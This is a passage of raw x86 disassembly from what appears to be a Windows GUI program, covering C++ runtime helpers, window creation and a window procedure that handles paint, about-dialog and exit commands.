  4044b0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4044b6:	b9 c4 f5 40 00       	mov    $0x40f5c4,%ecx
  4044bb:	8d 5c 24 14          	lea    0x14(%esp),%ebx
  4044bf:	e8 5c f3 ff ff       	call   0x403820
  4044c4:	33 db                	xor    %ebx,%ebx
  4044c6:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  4044ca:	f6 05 94 22 41 00 01 	testb  $0x1,0x412294
  4044d1:	8b 35 e0 a2 40 00    	mov    0x40a2e0,%esi
  4044d7:	75 29                	jne    0x404502
  4044d9:	83 0d 94 22 41 00 01 	orl    $0x1,0x412294
  4044e0:	8d 44 24 14          	lea    0x14(%esp),%eax
  4044e4:	50                   	push   %eax
  4044e5:	68 8c 22 41 00       	push   $0x41228c
  4044ea:	c6 44 24 48 01       	movb   $0x1,0x48(%esp)
  4044ef:	ff d6                	call   *%esi
  4044f1:	68 f0 96 40 00       	push   $0x4096f0
  4044f6:	e8 94 3d 00 00       	call   0x40828f
  4044fb:	83 c4 0c             	add    $0xc,%esp
  4044fe:	88 5c 24 40          	mov    %bl,0x40(%esp)
  404502:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404505:	80 39 01             	cmpb   $0x1,(%ecx)
  404508:	75 2e                	jne    0x404538
  40450a:	8d 54 24 14          	lea    0x14(%esp),%edx
  40450e:	52                   	push   %edx
  40450f:	8d 44 24 10          	lea    0x10(%esp),%eax
  404513:	50                   	push   %eax
  404514:	ff d6                	call   *%esi
  404516:	83 c4 08             	add    $0x8,%esp
  404519:	50                   	push   %eax
  40451a:	b9 8c 22 41 00       	mov    $0x41228c,%ecx
  40451f:	c6 44 24 44 02       	movb   $0x2,0x44(%esp)
  404524:	ff 15 fc a2 40 00    	call   *0x40a2fc
  40452a:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40452e:	88 5c 24 40          	mov    %bl,0x40(%esp)
  404532:	ff 15 d8 a2 40 00    	call   *0x40a2d8
  404538:	83 7c 24 28 08       	cmpl   $0x8,0x28(%esp)
  40453d:	72 0e                	jb     0x40454d
  40453f:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404543:	51                   	push   %ecx
  404544:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40454a:	83 c4 04             	add    $0x4,%esp
  40454d:	b8 8c 22 41 00       	mov    $0x41228c,%eax
  404552:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  404556:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40455d:	59                   	pop    %ecx
  40455e:	5e                   	pop    %esi
  40455f:	5b                   	pop    %ebx
  404560:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  404564:	33 cc                	xor    %esp,%ecx
  404566:	e8 15 3c 00 00       	call   0x408180
  40456b:	8b e5                	mov    %ebp,%esp
  40456d:	5d                   	pop    %ebp
  40456e:	c3                   	ret
  40456f:	cc                   	int3
  404570:	55                   	push   %ebp
  404571:	8b ec                	mov    %esp,%ebp
  404573:	51                   	push   %ecx
  404574:	33 c0                	xor    %eax,%eax
  404576:	89 46 10             	mov    %eax,0x10(%esi)
  404579:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40457c:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  404583:	88 06                	mov    %al,(%esi)
  404585:	8b 45 08             	mov    0x8(%ebp),%eax
  404588:	53                   	push   %ebx
  404589:	50                   	push   %eax
  40458a:	83 c8 ff             	or     $0xffffffff,%eax
  40458d:	33 db                	xor    %ebx,%ebx
  40458f:	8b ce                	mov    %esi,%ecx
  404591:	e8 fa 1c 00 00       	call   0x406290
  404596:	8b c6                	mov    %esi,%eax
  404598:	5b                   	pop    %ebx
  404599:	8b e5                	mov    %ebp,%esp
  40459b:	5d                   	pop    %ebp
  40459c:	c2 04 00             	ret    $0x4
  40459f:	cc                   	int3
  4045a0:	55                   	push   %ebp
  4045a1:	8b ec                	mov    %esp,%ebp
  4045a3:	6a ff                	push   $0xffffffff
  4045a5:	68 b0 90 40 00       	push   $0x4090b0
  4045aa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4045b0:	50                   	push   %eax
  4045b1:	83 ec 44             	sub    $0x44,%esp
  4045b4:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4045b9:	33 c5                	xor    %ebp,%eax
  4045bb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4045be:	53                   	push   %ebx
  4045bf:	56                   	push   %esi
  4045c0:	57                   	push   %edi
  4045c1:	50                   	push   %eax
  4045c2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4045c5:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4045cb:	8b 45 08             	mov    0x8(%ebp),%eax
  4045ce:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4045d1:	8b 45 14             	mov    0x14(%ebp),%eax
  4045d4:	33 db                	xor    %ebx,%ebx
  4045d6:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  4045d9:	3b c3                	cmp    %ebx,%eax
  4045db:	0f 84 91 00 00 00    	je     0x404672
  4045e1:	8b c8                	mov    %eax,%ecx
  4045e3:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  4045ea:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4045ed:	88 5d d4             	mov    %bl,-0x2c(%ebp)
  4045f0:	8d 71 01             	lea    0x1(%ecx),%esi
  4045f3:	8a 11                	mov    (%ecx),%dl
  4045f5:	41                   	inc    %ecx
  4045f6:	3a d3                	cmp    %bl,%dl
  4045f8:	75 f9                	jne    0x4045f3
  4045fa:	2b ce                	sub    %esi,%ecx
  4045fc:	8b f9                	mov    %ecx,%edi
  4045fe:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  404601:	e8 7a 2a 00 00       	call   0x407080
  404606:	8b d6                	mov    %esi,%edx
  404608:	52                   	push   %edx
  404609:	8d 75 b8             	lea    -0x48(%ebp),%esi
  40460c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40460f:	e8 5c ff ff ff       	call   0x404570
  404614:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  404618:	8b 3d e8 a1 40 00    	mov    0x40a1e8,%edi
  40461e:	be 10 00 00 00       	mov    $0x10,%esi
  404623:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  404626:	72 09                	jb     0x404631
  404628:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40462b:	50                   	push   %eax
  40462c:	ff d7                	call   *%edi
  40462e:	83 c4 04             	add    $0x4,%esp
  404631:	8b 45 b8             	mov    -0x48(%ebp),%eax
  404634:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  40463b:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  40463e:	88 5d d4             	mov    %bl,-0x2c(%ebp)
  404641:	39 75 cc             	cmp    %esi,-0x34(%ebp)
  404644:	73 03                	jae    0x404649
  404646:	8d 45 b8             	lea    -0x48(%ebp),%eax
  404649:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40464c:	8b 11                	mov    (%ecx),%edx
  40464e:	50                   	push   %eax
  40464f:	8b 45 0c             	mov    0xc(%ebp),%eax
  404652:	8b 08                	mov    (%eax),%ecx
  404654:	52                   	push   %edx
  404655:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  404658:	51                   	push   %ecx
  404659:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  40465c:	e8 2f 00 00 00       	call   0x404690
  404661:	83 c4 0c             	add    $0xc,%esp
  404664:	39 75 cc             	cmp    %esi,-0x34(%ebp)
  404667:	72 09                	jb     0x404672
  404669:	8b 55 b8             	mov    -0x48(%ebp),%edx
  40466c:	52                   	push   %edx
  40466d:	ff d7                	call   *%edi
  40466f:	83 c4 04             	add    $0x4,%esp
  404672:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404675:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40467c:	59                   	pop    %ecx
  40467d:	5f                   	pop    %edi
  40467e:	5e                   	pop    %esi
  40467f:	5b                   	pop    %ebx
  404680:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404683:	33 cd                	xor    %ebp,%ecx
  404685:	e8 f6 3a 00 00       	call   0x408180
  40468a:	8b e5                	mov    %ebp,%esp
  40468c:	5d                   	pop    %ebp
  40468d:	c2 10 00             	ret    $0x10
  404690:	55                   	push   %ebp
  404691:	8b ec                	mov    %esp,%ebp
  404693:	83 e4 f8             	and    $0xfffffff8,%esp
  404696:	6a ff                	push   $0xffffffff
  404698:	68 69 90 40 00       	push   $0x409069
  40469d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4046a3:	50                   	push   %eax
  4046a4:	81 ec 00 01 00 00    	sub    $0x100,%esp
  4046aa:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4046af:	33 c4                	xor    %esp,%eax
  4046b1:	89 84 24 f8 00 00 00 	mov    %eax,0xf8(%esp)
  4046b8:	53                   	push   %ebx
  4046b9:	56                   	push   %esi
  4046ba:	57                   	push   %edi
  4046bb:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4046c0:	33 c4                	xor    %esp,%eax
  4046c2:	50                   	push   %eax
  4046c3:	8d 84 24 10 01 00 00 	lea    0x110(%esp),%eax
  4046ca:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4046d0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4046d3:	33 db                	xor    %ebx,%ebx
  4046d5:	50                   	push   %eax
  4046d6:	8b f2                	mov    %edx,%esi
  4046d8:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4046dc:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  4046e0:	ff 15 d4 a2 40 00    	call   *0x40a2d4
  4046e6:	84 c0                	test   %al,%al
  4046e8:	0f 84 63 02 00 00    	je     0x404951
  4046ee:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  4046f2:	c7 44 24 1c 38 a9 40 	movl   $0x40a938,0x1c(%esp)
  4046f9:	00 
  4046fa:	ff 15 4c a1 40 00    	call   *0x40a14c
  404700:	53                   	push   %ebx
  404701:	53                   	push   %ebx
  404702:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  404706:	51                   	push   %ecx
  404707:	89 9c 24 24 01 00 00 	mov    %ebx,0x124(%esp)
  40470e:	bf 01 00 00 00       	mov    $0x1,%edi
  404713:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  404717:	89 7c 24 24          	mov    %edi,0x24(%esp)
  40471b:	ff 15 48 a1 40 00    	call   *0x40a148
  404721:	89 bc 24 18 01 00 00 	mov    %edi,0x118(%esp)
  404728:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40472c:	8b 42 04             	mov    0x4(%edx),%eax
  40472f:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  404733:	c7 44 04 1c 34 a9 40 	movl   $0x40a934,0x1c(%esp,%eax,1)
  40473a:	00 
  40473b:	ff 15 44 a1 40 00    	call   *0x40a144
  404741:	c7 44 24 20 f4 a8 40 	movl   $0x40a8f4,0x20(%esp)
  404748:	00 
  404749:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  40474d:	c7 44 24 60 04 00 00 	movl   $0x4,0x60(%esp)
  404754:	00 
  404755:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404758:	51                   	push   %ecx
  404759:	8d 54 24 20          	lea    0x20(%esp),%edx
  40475d:	52                   	push   %edx
  40475e:	c7 84 24 20 01 00 00 	movl   $0x3,0x120(%esp)
  404765:	03 00 00 00 
  404769:	e8 d2 34 00 00       	call   0x407c40
  40476e:	8b c6                	mov    %esi,%eax
  404770:	83 c4 08             	add    $0x8,%esp
  404773:	c7 84 24 c8 00 00 00 	movl   $0xf,0xc8(%esp)
  40477a:	0f 00 00 00 
  40477e:	89 9c 24 c4 00 00 00 	mov    %ebx,0xc4(%esp)
  404785:	88 9c 24 b4 00 00 00 	mov    %bl,0xb4(%esp)
  40478c:	8d 78 01             	lea    0x1(%eax),%edi
  40478f:	90                   	nop
  404790:	8a 08                	mov    (%eax),%cl
  404792:	40                   	inc    %eax
  404793:	3a cb                	cmp    %bl,%cl
  404795:	75 f9                	jne    0x404790
  404797:	2b c7                	sub    %edi,%eax
  404799:	8b f8                	mov    %eax,%edi
  40479b:	8b c6                	mov    %esi,%eax
  40479d:	8d b4 24 b4 00 00 00 	lea    0xb4(%esp),%esi
  4047a4:	e8 d7 28 00 00       	call   0x407080
  4047a9:	8b ce                	mov    %esi,%ecx
  4047ab:	8d 94 24 d0 00 00 00 	lea    0xd0(%esp),%edx
  4047b2:	c6 84 24 18 01 00 00 	movb   $0x4,0x118(%esp)
  4047b9:	04 
  4047ba:	e8 d1 ef ff ff       	call   0x403790
  4047bf:	bf 10 00 00 00       	mov    $0x10,%edi
  4047c4:	c6 84 24 18 01 00 00 	movb   $0x6,0x118(%esp)
  4047cb:	06 
  4047cc:	39 bc 24 c8 00 00 00 	cmp    %edi,0xc8(%esp)
  4047d3:	72 11                	jb     0x4047e6
  4047d5:	8b 84 24 b4 00 00 00 	mov    0xb4(%esp),%eax
  4047dc:	50                   	push   %eax
  4047dd:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4047e3:	83 c4 04             	add    $0x4,%esp
  4047e6:	8d b4 24 ec 00 00 00 	lea    0xec(%esp),%esi
  4047ed:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4047f1:	c7 84 24 c8 00 00 00 	movl   $0xf,0xc8(%esp)
  4047f8:	0f 00 00 00 
  4047fc:	89 9c 24 c4 00 00 00 	mov    %ebx,0xc4(%esp)
  404803:	88 9c 24 b4 00 00 00 	mov    %bl,0xb4(%esp)
  40480a:	e8 51 18 00 00       	call   0x406060
  40480f:	c6 84 24 18 01 00 00 	movb   $0x7,0x118(%esp)
  404816:	07 
  404817:	8b 8c 24 d0 00 00 00 	mov    0xd0(%esp),%ecx
  40481e:	39 bc 24 e4 00 00 00 	cmp    %edi,0xe4(%esp)
  404825:	73 07                	jae    0x40482e
  404827:	8d 8c 24 d0 00 00 00 	lea    0xd0(%esp),%ecx
  40482e:	8b 55 08             	mov    0x8(%ebp),%edx
  404831:	52                   	push   %edx
  404832:	51                   	push   %ecx
  404833:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404837:	50                   	push   %eax
  404838:	8b 45 0c             	mov    0xc(%ebp),%eax
  40483b:	50                   	push   %eax
  40483c:	ff 15 dc a2 40 00    	call   *0x40a2dc
  404842:	83 bc 24 00 01 00 00 	cmpl   $0x8,0x100(%esp)
  404849:	08 
  40484a:	8b 35 e8 a1 40 00    	mov    0x40a1e8,%esi
  404850:	72 0d                	jb     0x40485f
  404852:	8b 8c 24 ec 00 00 00 	mov    0xec(%esp),%ecx
  404859:	51                   	push   %ecx
  40485a:	ff d6                	call   *%esi
  40485c:	83 c4 04             	add    $0x4,%esp
  40485f:	33 d2                	xor    %edx,%edx
  404861:	c7 84 24 00 01 00 00 	movl   $0x7,0x100(%esp)
  404868:	07 00 00 00 
  40486c:	89 9c 24 fc 00 00 00 	mov    %ebx,0xfc(%esp)
  404873:	66 89 94 24 ec 00 00 	mov    %dx,0xec(%esp)
  40487a:	00 
  40487b:	39 bc 24 e4 00 00 00 	cmp    %edi,0xe4(%esp)
  404882:	72 0d                	jb     0x404891
  404884:	8b 84 24 d0 00 00 00 	mov    0xd0(%esp),%eax
  40488b:	50                   	push   %eax
  40488c:	ff d6                	call   *%esi
  40488e:	83 c4 04             	add    $0x4,%esp
  404891:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  404895:	c7 84 24 e4 00 00 00 	movl   $0xf,0xe4(%esp)
  40489c:	0f 00 00 00 
  4048a0:	89 9c 24 e0 00 00 00 	mov    %ebx,0xe0(%esp)
  4048a7:	88 9c 24 d0 00 00 00 	mov    %bl,0xd0(%esp)
  4048ae:	8b 42 04             	mov    0x4(%edx),%eax
  4048b1:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  4048b5:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4048b9:	c7 44 04 1c 34 a9 40 	movl   $0x40a934,0x1c(%esp,%eax,1)
  4048c0:	00 
  4048c1:	c7 84 24 18 01 00 00 	movl   $0x8,0x118(%esp)
  4048c8:	08 00 00 00 
  4048cc:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4048d0:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4048d4:	c7 44 24 20 f4 a8 40 	movl   $0x40a8f4,0x20(%esp)
  4048db:	00 
  4048dc:	c6 84 24 18 01 00 00 	movb   $0x9,0x118(%esp)
  4048e3:	09 
  4048e4:	f6 44 24 60 01       	testb  $0x1,0x60(%esp)
  4048e9:	74 0c                	je     0x4048f7
  4048eb:	8b 54 24 30          	mov    0x30(%esp),%edx
  4048ef:	8b 02                	mov    (%edx),%eax
  4048f1:	50                   	push   %eax
  4048f2:	ff d6                	call   *%esi
  4048f4:	83 c4 04             	add    $0x4,%esp
  4048f7:	53                   	push   %ebx
  4048f8:	53                   	push   %ebx
  4048f9:	53                   	push   %ebx
  4048fa:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  4048fe:	ff 15 58 a1 40 00    	call   *0x40a158
  404904:	53                   	push   %ebx
  404905:	53                   	push   %ebx
  404906:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  40490a:	ff 15 54 a1 40 00    	call   *0x40a154
  404910:	83 64 24 60 fe       	andl   $0xfffffffe,0x60(%esp)
  404915:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  404919:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  40491d:	c6 84 24 18 01 00 00 	movb   $0x8,0x118(%esp)
  404924:	08 
  404925:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  40492b:	c7 84 24 18 01 00 00 	movl   $0xffffffff,0x118(%esp)
  404932:	ff ff ff ff 
  404936:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40493a:	8b 48 04             	mov    0x4(%eax),%ecx
  40493d:	8b 15 34 a1 40 00    	mov    0x40a134,%edx
  404943:	89 54 0c 1c          	mov    %edx,0x1c(%esp,%ecx,1)
  404947:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  40494b:	ff 15 6c a1 40 00    	call   *0x40a16c
  404951:	8b 8c 24 10 01 00 00 	mov    0x110(%esp),%ecx
  404958:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40495f:	59                   	pop    %ecx
  404960:	5f                   	pop    %edi
  404961:	5e                   	pop    %esi
  404962:	5b                   	pop    %ebx
  404963:	8b 8c 24 f8 00 00 00 	mov    0xf8(%esp),%ecx
  40496a:	33 cc                	xor    %esp,%ecx
  40496c:	e8 0f 38 00 00       	call   0x408180
  404971:	8b e5                	mov    %ebp,%esp
  404973:	5d                   	pop    %ebp
  404974:	c3                   	ret
  404975:	cc                   	int3
  404976:	cc                   	int3
  404977:	cc                   	int3
  404978:	cc                   	int3
  404979:	cc                   	int3
  40497a:	cc                   	int3
  40497b:	cc                   	int3
  40497c:	cc                   	int3
  40497d:	cc                   	int3
  40497e:	cc                   	int3
  40497f:	cc                   	int3
  404980:	55                   	push   %ebp
  404981:	8b ec                	mov    %esp,%ebp
  404983:	83 e4 f8             	and    $0xfffffff8,%esp
  404986:	83 ec 1c             	sub    $0x1c,%esp
  404989:	53                   	push   %ebx
  40498a:	8b 1d 84 a2 40 00    	mov    0x40a284,%ebx
  404990:	56                   	push   %esi
  404991:	57                   	push   %edi
  404992:	8b 7d 08             	mov    0x8(%ebp),%edi
  404995:	6a 64                	push   $0x64
  404997:	68 e8 10 41 00       	push   $0x4110e8
  40499c:	33 f6                	xor    %esi,%esi
  40499e:	6a 67                	push   $0x67
  4049a0:	57                   	push   %edi
  4049a1:	89 74 24 20          	mov    %esi,0x20(%esp)
  4049a5:	89 74 24 28          	mov    %esi,0x28(%esp)
  4049a9:	89 74 24 2c          	mov    %esi,0x2c(%esp)
  4049ad:	89 74 24 30          	mov    %esi,0x30(%esp)
  4049b1:	89 74 24 34          	mov    %esi,0x34(%esp)
  4049b5:	ff d3                	call   *%ebx
  4049b7:	6a 64                	push   $0x64
  4049b9:	68 20 10 41 00       	push   $0x411020
  4049be:	6a 6d                	push   $0x6d
  4049c0:	57                   	push   %edi
  4049c1:	ff d3                	call   *%ebx
  4049c3:	8b c7                	mov    %edi,%eax
  4049c5:	e8 c6 00 00 00       	call   0x404a90
  4049ca:	56                   	push   %esi
  4049cb:	57                   	push   %edi
  4049cc:	56                   	push   %esi
  4049cd:	56                   	push   %esi
  4049ce:	56                   	push   %esi
  4049cf:	68 00 00 00 80       	push   $0x80000000
  4049d4:	56                   	push   %esi
  4049d5:	68 00 00 00 80       	push   $0x80000000
  4049da:	68 00 00 cf 00       	push   $0xcf0000
  4049df:	68 e8 10 41 00       	push   $0x4110e8
  4049e4:	68 20 10 41 00       	push   $0x411020
  4049e9:	56                   	push   %esi
  4049ea:	89 3d b0 11 41 00    	mov    %edi,0x4111b0
  4049f0:	ff 15 98 a2 40 00    	call   *0x40a298
  4049f6:	8b d8                	mov    %eax,%ebx
  4049f8:	85 db                	test   %ebx,%ebx
  4049fa:	0f 84 85 00 00 00    	je     0x404a85
  404a00:	56                   	push   %esi
  404a01:	53                   	push   %ebx
  404a02:	ff 15 9c a2 40 00    	call   *0x40a29c
  404a08:	53                   	push   %ebx
  404a09:	ff 15 a0 a2 40 00    	call   *0x40a2a0
  404a0f:	6a 6d                	push   $0x6d
  404a11:	57                   	push   %edi
  404a12:	ff 15 88 a2 40 00    	call   *0x40a288
  404a18:	e8 53 02 00 00       	call   0x404c70
  404a1d:	ff 15 cc a2 40 00    	call   *0x40a2cc
  404a23:	33 c0                	xor    %eax,%eax
  404a25:	66 89 44 24 0c       	mov    %ax,0xc(%esp)
  404a2a:	6a 0a                	push   $0xa
  404a2c:	b8 b8 a7 40 00       	mov    $0x40a7b8,%eax
  404a31:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404a35:	c7 44 24 24 07 00 00 	movl   $0x7,0x24(%esp)
  404a3c:	00 
  404a3d:	89 74 24 20          	mov    %esi,0x20(%esp)
  404a41:	e8 ca 28 00 00       	call   0x407310
  404a46:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  404a4a:	51                   	push   %ecx
  404a4b:	ff 15 08 a0 40 00    	call   *0x40a008
  404a51:	83 c4 04             	add    $0x4,%esp
  404a54:	83 7c 24 20 08       	cmpl   $0x8,0x20(%esp)
  404a59:	72 0e                	jb     0x404a69
  404a5b:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404a5f:	52                   	push   %edx
  404a60:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  404a66:	83 c4 04             	add    $0x4,%esp
  404a69:	ff 15 00 a0 40 00    	call   *0x40a000
  404a6f:	ff 15 04 a0 40 00    	call   *0x40a004
  404a75:	e8 96 0b 00 00       	call   0x405610
  404a7a:	8b c6                	mov    %esi,%eax
  404a7c:	5f                   	pop    %edi
  404a7d:	5e                   	pop    %esi
  404a7e:	5b                   	pop    %ebx
  404a7f:	8b e5                	mov    %ebp,%esp
  404a81:	5d                   	pop    %ebp
  404a82:	c2 10 00             	ret    $0x10
  404a85:	5f                   	pop    %edi
  404a86:	5e                   	pop    %esi
  404a87:	33 c0                	xor    %eax,%eax
  404a89:	5b                   	pop    %ebx
  404a8a:	8b e5                	mov    %ebp,%esp
  404a8c:	5d                   	pop    %ebp
  404a8d:	c2 10 00             	ret    $0x10
  404a90:	55                   	push   %ebp
  404a91:	8b ec                	mov    %esp,%ebp
  404a93:	83 ec 34             	sub    $0x34,%esp
  404a96:	56                   	push   %esi
  404a97:	8b 35 8c a2 40 00    	mov    0x40a28c,%esi
  404a9d:	6a 6b                	push   $0x6b
  404a9f:	50                   	push   %eax
  404aa0:	c7 45 d0 30 00 00 00 	movl   $0x30,-0x30(%ebp)
  404aa7:	c7 45 d4 03 00 00 00 	movl   $0x3,-0x2c(%ebp)
  404aae:	c7 45 d8 10 4b 40 00 	movl   $0x404b10,-0x28(%ebp)
  404ab5:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  404abc:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  404ac3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404ac6:	ff d6                	call   *%esi
  404ac8:	68 00 7f 00 00       	push   $0x7f00
  404acd:	6a 00                	push   $0x0
  404acf:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404ad2:	ff 15 90 a2 40 00    	call   *0x40a290
  404ad8:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404adb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404ade:	6a 6c                	push   $0x6c
  404ae0:	50                   	push   %eax
  404ae1:	c7 45 f0 06 00 00 00 	movl   $0x6,-0x10(%ebp)
  404ae8:	c7 45 f4 6d 00 00 00 	movl   $0x6d,-0xc(%ebp)
  404aef:	c7 45 f8 20 10 41 00 	movl   $0x411020,-0x8(%ebp)
  404af6:	ff d6                	call   *%esi
  404af8:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404afb:	51                   	push   %ecx
  404afc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404aff:	ff 15 ac a2 40 00    	call   *0x40a2ac
  404b05:	5e                   	pop    %esi
  404b06:	8b e5                	mov    %ebp,%esp
  404b08:	5d                   	pop    %ebp
  404b09:	c3                   	ret
  404b0a:	cc                   	int3
  404b0b:	cc                   	int3
  404b0c:	cc                   	int3
  404b0d:	cc                   	int3
  404b0e:	cc                   	int3
  404b0f:	cc                   	int3
  404b10:	55                   	push   %ebp
  404b11:	8b ec                	mov    %esp,%ebp
  404b13:	83 e4 f8             	and    $0xfffffff8,%esp
  404b16:	83 ec 4c             	sub    $0x4c,%esp
  404b19:	a1 18 e0 40 00       	mov    0x40e018,%eax
  404b1e:	33 c4                	xor    %esp,%eax
  404b20:	89 44 24 48          	mov    %eax,0x48(%esp)
  404b24:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404b27:	8b c1                	mov    %ecx,%eax
  404b29:	83 e8 02             	sub    $0x2,%eax
  404b2c:	56                   	push   %esi
  404b2d:	8b 75 08             	mov    0x8(%ebp),%esi
  404b30:	0f 84 d5 00 00 00    	je     0x404c0b
  404b36:	83 e8 0d             	sub    $0xd,%eax
  404b39:	0f 84 a0 00 00 00    	je     0x404bdf
  404b3f:	2d 02 01 00 00       	sub    $0x102,%eax
  404b44:	74 22                	je     0x404b68
  404b46:	8b 45 14             	mov    0x14(%ebp),%eax
  404b49:	8b 55 10             	mov    0x10(%ebp),%edx
  404b4c:	50                   	push   %eax
  404b4d:	52                   	push   %edx
  404b4e:	51                   	push   %ecx
  404b4f:	56                   	push   %esi
  404b50:	ff 15 7c a2 40 00    	call   *0x40a27c
  404b56:	5e                   	pop    %esi
  404b57:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  404b5b:	33 cc                	xor    %esp,%ecx
  404b5d:	e8 1e 36 00 00       	call   0x408180
  404b62:	8b e5                	mov    %ebp,%esp
  404b64:	5d                   	pop    %ebp
  404b65:	c2 10 00             	ret    $0x10
  404b68:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404b6b:	0f b7 c1             	movzwl %cx,%eax
  404b6e:	83 e8 68             	sub    $0x68,%eax
  404b71:	74 41                	je     0x404bb4
  404b73:	48                   	dec    %eax
  404b74:	74 23                	je     0x404b99
  404b76:	8b 45 14             	mov    0x14(%ebp),%eax
  404b79:	50                   	push   %eax
  404b7a:	51                   	push   %ecx
  404b7b:	68 11 01 00 00       	push   $0x111
  404b80:	56                   	push   %esi
  404b81:	ff 15 7c a2 40 00    	call   *0x40a27c
  404b87:	5e                   	pop    %esi
  404b88:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  404b8c:	33 cc                	xor    %esp,%ecx
  404b8e:	e8 ed 35 00 00       	call   0x408180
  404b93:	8b e5                	mov    %ebp,%esp
  404b95:	5d                   	pop    %ebp
  404b96:	c2 10 00             	ret    $0x10
  404b99:	56                   	push   %esi
  404b9a:	ff 15 94 a2 40 00    	call   *0x40a294
  404ba0:	33 c0                	xor    %eax,%eax
  404ba2:	5e                   	pop    %esi
  404ba3:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  404ba7:	33 cc                	xor    %esp,%ecx
  404ba9:	e8 d2 35 00 00       	call   0x408180
  404bae:	8b e5                	mov    %ebp,%esp
  404bb0:	5d                   	pop    %ebp
  404bb1:	c2 10 00             	ret    $0x10
  404bb4:	8b 0d b0 11 41 00    	mov    0x4111b0,%ecx
  404bba:	6a 00                	push   $0x0
  404bbc:	68 30 4c 40 00       	push   $0x404c30
  404bc1:	56                   	push   %esi
  404bc2:	6a 67                	push   $0x67
  404bc4:	51                   	push   %ecx
  404bc5:	ff 15 a4 a2 40 00    	call   *0x40a2a4
  404bcb:	33 c0                	xor    %eax,%eax
  404bcd:	5e                   	pop    %esi
  404bce:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  404bd2:	33 cc                	xor    %esp,%ecx
  404bd4:	e8 a7 35 00 00       	call   0x408180
  404bd9:	8b e5                	mov    %ebp,%esp
  404bdb:	5d                   	pop    %ebp
  404bdc:	c2 10 00             	ret    $0x10
  404bdf:	8d 54 24 08          	lea    0x8(%esp),%edx
  404be3:	52                   	push   %edx
  404be4:	56                   	push   %esi
  404be5:	ff 15 80 a2 40 00    	call   *0x40a280
  404beb:	8d 44 24 08          	lea    0x8(%esp),%eax
  404bef:	50                   	push   %eax
  404bf0:	56                   	push   %esi
  404bf1:	ff 15 b4 a2 40 00    	call   *0x40a2b4
